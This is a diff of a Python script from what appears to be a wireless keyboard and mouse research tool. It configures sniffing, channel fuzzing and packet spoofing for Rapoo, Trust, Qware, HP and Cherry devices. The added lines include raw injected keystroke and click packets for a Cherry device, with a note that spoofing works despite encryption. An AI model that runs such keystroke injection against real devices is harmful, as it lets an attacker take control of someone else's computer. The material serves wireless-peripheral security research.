@@ -38,11 +38,10 @@ from devices.Rapoo.rapoo_mouse import Rapoo_Mouse
 from devices.Rapoo.rapoo_keyboard import Rapoo_Keyboard
 from devices.Edenwood.edenwood_mouse import Edenwood_Mouse
 from devices.Edenwood.edenwood_keyboard import Edenwood_Keyboard
-from devices.Cherry.cherry_mouse import Cherry_Mouse
+from devices.Cherry.cherry import Cherry
 from devices.Qware.qware_keyboard import Qware_Keyboard
 from devices.Qware.qware_mouse import Qware_Mouse
 from devices.Hp.hp_mouse import HP_Mouse
-from binascii import unhexlify
 
 common.init_args('./main.py')
 common.parse_and_init()
@@ -52,8 +51,8 @@ common.parse_and_init()
 ----------------------------Initial analysis----------------------------
 """
 
-#Device.quick_sniff("4a:b4:cb:dc:b9", [5, 11, 17, 51, 57, 63, 69, 75], common.RF_RATE_2M, 30)
-#Device.fuzz_channels("4a:b4:cb:80", common.RF_RATE_2M)
+#Device.quick_sniff("25:2d:8e", [22, 28, 44, 54, 60, 93, 7, 67, 76, 68, 78, 13, 61, 73, 69, 38, 0, 29, 33, 2, 45, 94, 95, 8, 20], common.RF_RATE_1M, 22)
+#Device.fuzz_channels("25:2d:8e", common.RF_RATE_1M)
 
 
 """
@@ -78,7 +77,7 @@ attack_tlsr85_keyboard = [
 
 #trust_keyboard.sniff()
 #trust_mouse.sniff()
-trust_keyboard.spoof(attack_tlsr85_keyboard)
+#trust_keyboard.spoof(attack_tlsr85_keyboard)
 
 
 
@@ -196,16 +195,25 @@ attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_mo
 """
 # NOT IMPLEMENTED
 
-hp_mouse = HP_Mouse("aa:ab:e2:dc", 0x11021, 0x5c3c)
+hp_mouse = HP_Mouse("f1:6e:3d:c4:09", 0x11021, 0x63DA)
 #hp_mouse.sniff()
-#hp_mouse.spoof([unhexlify("aaabe2dc7b89ee99401d6b102c987792fb6ef07b32")])
+#print(hp_mouse.build_packet())
+#hp_mouse.spoof([hp_mouse.build_packet()])
 
 
 """
 ----------------------------Cherry----------------------------
 """
-# NOT IMPLEMENTED
+# Is encrypted, sniffing is not complete
+# Spoofing works when sending a few keystrokes
 
-cherry_mouse = Cherry_Mouse("ac:da:da:96", 0x11021, 0x3c32)
-#cherry_mouse.sniff()
+cherry = Cherry("25:2d:8e")
+#cherry.sniff()
+
+#cherry.spoof([b"\x25\x2d\x8e\xfe\xe0\x39\x8f\xad\x85\xac\xf0\xf7\x23\xb0\xe8\x90\xbc\x6c\xc8\x82\xfe"]) # L GUI
+#cherry.spoof([b"\x25\x2d\x8e\xea\xd4\x0f\xe4\xa4\x86\x2f\x10\x5a\x23\xda\x81\x16\xd4\x32\x49\x09\xfe"]) # L
+#cherry.spoof([b"\x25\x2d\x8e\xab\x72\x8a\x15\x3c\x7e\x8b\xde\xba\xd6\x8c\x42\x4f\xe1\xb9\xee\x62\xfe"]) # S
+#cherry.spoof([b"\x25\x2d\x8e\x97\xe4\x83\xf2\xa7\x0f\x62\xfc\xa7\xc4\x46\x0e\x0a\xa5\xd6\x50\x6c\xfe"]) # A
+#cherry.spoof([b"\x25\x2d\x8e\x14\x84\xa1\x0c\x4f\x6e\x49\xcd\xcc\x9c\xb4\x00\x74\xfb\x79\x6a\xba\xfe"]) # Z
+cherry.spoof([b"\x25\x2d\x8e\x4a\xba\x5e\xa0\x7b\x8b\x60\xab\xb8\xfd\xed\x61\xaf\x7c\x03\x98\xee"]) # Right click
 
